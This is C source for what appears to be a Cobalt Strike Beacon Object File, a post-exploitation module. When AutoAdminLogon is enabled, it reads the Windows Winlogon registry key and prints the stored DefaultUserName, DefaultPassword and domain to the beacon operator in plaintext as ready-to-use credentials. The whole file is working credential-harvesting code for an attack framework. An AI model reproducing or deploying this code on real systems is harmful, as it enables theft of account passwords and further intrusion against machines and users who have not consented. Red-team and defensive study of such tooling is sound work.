#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegOpenKeyExW(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegQueryValueExW(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
DECLSPEC_IMPORT WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *str);
DECLSPEC_IMPORT WINBASEAPI int __cdecl MSVCRT$_wcsicmp(const wchar_t *str1, const wchar_t *str2);

#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)
#define STATUS_OBJECT_NAME_NOT_FOUND     ((NTSTATUS)0xC0000034L)

void CheckAutoLogon() {
    HKEY hKey = NULL;
    LONG result;
    DWORD dwType = 0;
    WCHAR password[512] = {0};
    DWORD dwSize = sizeof(password);
    
    result = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_QUERY_VALUE, &hKey);
    
    if (result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Failed to open Winlogon registry key: %lu\n", result);
        return;
    }
    
    DWORD autoLogon = 0;
    DWORD autoSize = sizeof(autoLogon);
    result = ADVAPI32$RegQueryValueExW(hKey, L"AutoAdminLogon", 0, &dwType, (LPBYTE)&autoLogon, &autoSize);
    
    if (result == ERROR_SUCCESS && dwType == REG_SZ) {
        WCHAR autoLogonStr[16] = {0};
        autoSize = sizeof(autoLogonStr);
        result = ADVAPI32$RegQueryValueExW(hKey, L"AutoAdminLogon", 0, &dwType, (LPBYTE)autoLogonStr, &autoSize);
        if (result == ERROR_SUCCESS) {
            autoLogon = (MSVCRT$wcslen(autoLogonStr) > 0 && (autoLogonStr[0] == L'1' || MSVCRT$_wcsicmp(autoLogonStr, L"true") == 0));
        }
    }
    
    if (autoLogon) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] AutoAdminLogon is enabled\n");
    
        WCHAR username[256] = {0};
        DWORD userSize = sizeof(username);
        result = ADVAPI32$RegQueryValueExW(hKey, L"DefaultUserName", 0, &dwType, (LPBYTE)username, &userSize);
        
        if (result == ERROR_SUCCESS && dwType == REG_SZ) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] DefaultUserName: %ls\n", username);
            result = ADVAPI32$RegQueryValueExW(hKey, L"DefaultPassword", 0, &dwType, (LPBYTE)password, &dwSize);
            
            if (result == ERROR_SUCCESS && dwType == REG_SZ) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] DefaultPassword: %ls\n", password);

                WCHAR domain[256] = {0};
                DWORD domainSize = sizeof(domain);
                result = ADVAPI32$RegQueryValueExW(hKey, L"DefaultDomainName", 0, &dwType, (LPBYTE)domain, &domainSize);
                
                if (result == ERROR_SUCCESS && dwType == REG_SZ) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] DefaultDomainName: %ls\n", domain);
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Credentials: %ls\\%ls:%ls\n", domain, username, password);
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Credentials: .\\%ls:%ls\n", username, password);
                }
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[X] DefaultPassword not found\n");
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[X] DefaultUserName not found\n");
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[X] AutoAdminLogon is disabled\n");
    }
    
    if (hKey != NULL) {
        ADVAPI32$RegCloseKey(hKey);
    }
}

VOID go (IN PCHAR Buffer, IN ULONG Length) {
    CheckAutoLogon();
}